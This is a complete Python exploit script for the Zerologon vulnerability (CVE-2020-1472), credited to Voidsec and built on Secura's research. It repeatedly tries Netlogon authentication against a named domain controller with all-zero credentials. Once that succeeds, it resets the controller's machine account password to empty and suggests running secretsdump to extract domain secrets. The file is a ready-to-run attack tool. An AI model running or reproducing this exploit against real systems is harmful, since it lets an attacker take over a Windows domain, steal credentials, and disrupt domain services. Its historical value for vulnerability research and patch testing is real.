#!/usr/bin/env python3
# Paolo Stagno aka Voidsec - https://voidsec.com
# Original script and research by Secura
from impacket.dcerpc.v5 import nrpc, epm
from impacket.dcerpc.v5.dtypes import NULL
from impacket.dcerpc.v5 import transport
from impacket import crypto

import hmac, hashlib, struct, sys, socket, time
from binascii import hexlify, unhexlify
from subprocess import check_call

# Give up brute-forcing after this many attempts. If vulnerable, 256 attempts are expected to be necessary on average.
MAX_ATTEMPTS = 2000  # False negative chance: 0.04%


def fail(msg):
    print(msg, file=sys.stderr)
    print('This might have been caused by invalid arguments or network issues.', file=sys.stderr)
    sys.exit(2)


def try_zerologon(rpc_con, dc_handle, target_computer):
    # EXPLOIT
    """
    Authenticator: A pointer to a NETLOGON_AUTHENTICATOR structure, as specified in section 2.2.1.1.5, 
    that contains the encrypted logon credential and a time stamp. 
        typedef struct _NETLOGON_AUTHENTICATOR { 
           NETLOGON_CREDENTIAL Credential; 
           DWORD Timestamp; 
         }

        Timestamp:  An integer value that contains the time of day at which the client constructed this 
        authentication credential, represented as the number of elapsed seconds since 00:00:00 of January 1, 1970. 
        The authenticator is constructed just before making a call to a method that requires its usage. 

        typedef struct _NETLOGON_CREDENTIAL { 
            CHAR data[8]; 
        } 

    ClearNewPassword: A pointer to an NL_TRUST_PASSWORD structure, as specified in section 2.2.1.3.7, 
    that contains the new password encrypted as specified in Calling NetrServerPasswordSet2 (section 3.4.5.2.5).  
        [MS-NRPC]-170915.pdf

        typedef struct _NL_TRUST_PASSWORD { 
            WCHAR Buffer[256]; 
            ULONG Length; 
        } 

    ReturnAuthenticator: A pointer to a NETLOGON_AUTHENTICATOR structure, as specified in section 2.2.1.1.5, 
    that contains the server return authenticator.
    """
    # def NetrServerPasswordSet2(dce, primaryName, accountName, secureChannelType, computerName, authenticator, returnAuthenticator, newPswd):
    pwd_change = nrpc.hNetrServerPasswordSet2(rpc_con, dc_handle + '\x00', target_computer + '$\x00',
                                              nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel,
                                              target_computer + '\x00', authenticator=0, returnAuthenticator=0,
                                              newPswd=0)
    # Return Values: The method returns 0x00000000 on success; otherwise, it returns a nonzero error code.
    if pwd_change['ErrorCode'] == 0:
        print(
            "[+] DC Password Change Status: SUCCESS!"
            "\nTry running Impacket’s ‘secretsdump’ script with the new DC password")
    else:
        print("Err #: {}".format(pwd_change['ErrCode']))
    # ------------------------
    return


def try_zero_authenticate(dc_handle, dc_ip, target_computer):
    # Connect to the DC's Netlogon service.
    binding = epm.hept_map(dc_ip, nrpc.MSRPC_UUID_NRPC, protocol='ncacn_ip_tcp')
    rpc_con = transport.DCERPCTransportFactory(binding).get_dce_rpc()
    rpc_con.connect()
    rpc_con.bind(nrpc.MSRPC_UUID_NRPC)

    # Use an all-zero challenge and credential.
    plaintext = b'\x00' * 8
    ciphertext = b'\x00' * 8

    # Standard flags observed from a Windows 10 client (including AES), with only the sign/seal flag disabled.
    flags = 0x212fffff

    # Send challenge and authentication request.
    nrpc.hNetrServerReqChallenge(rpc_con, dc_handle + '\x00', target_computer + '\x00', plaintext)
    try:
        server_auth = nrpc.hNetrServerAuthenticate3(
            rpc_con, dc_handle + '\x00', target_computer + '$\x00',
            nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel,
                     target_computer + '\x00', ciphertext, flags
        )

        # It worked!
        assert server_auth['ErrorCode'] == 0
        return rpc_con

    except nrpc.DCERPCSessionError as ex:
        # Failure should be due to a STATUS_ACCESS_DENIED error. Otherwise, the attack is probably not working.
        if ex.get_error_code() == 0xc0000022:
            return None
        else:
            fail(f'Unexpected error code from DC: {ex.get_error_code()}.')
    except BaseException as ex:
        fail(f'Unexpected error: {ex}.')


def perform_attack(dc_handle, dc_ip, target_computer):
    # Keep authenticating until successful. Expected average number of attempts needed: 256.
    print('Performing authentication attempts...')
    rpc_con = None
    for attempt in range(0, MAX_ATTEMPTS):
        rpc_con = try_zero_authenticate(dc_handle, dc_ip, target_computer)

        if rpc_con is None:
            print('=', end='', flush=True)
        else:
            break

    if rpc_con:
        # print(rpc_con)
        print('\nSuccess! DC can be fully compromised by a Zerologon attack.')
        print("Exploiting ZeroLogon vulnerability...")
        try_zerologon(rpc_con, dc_handle, target_computer)
    else:
        print('\nAttack failed. Target is probably patched.')
        sys.exit(1)


if __name__ == '__main__':
    if not (3 <= len(sys.argv) <= 4):
        print('Usage: cve-2020-1472-exploit.py <dc-name> <dc-ip>\n')
        print('Note: dc-name should be the (NetBIOS) computer name of the domain controller.')
        sys.exit(1)
    else:
        [_, dc_name, dc_ip] = sys.argv

        dc_name = dc_name.rstrip('$')
        perform_attack('\\\\' + dc_name, dc_ip, dc_name)
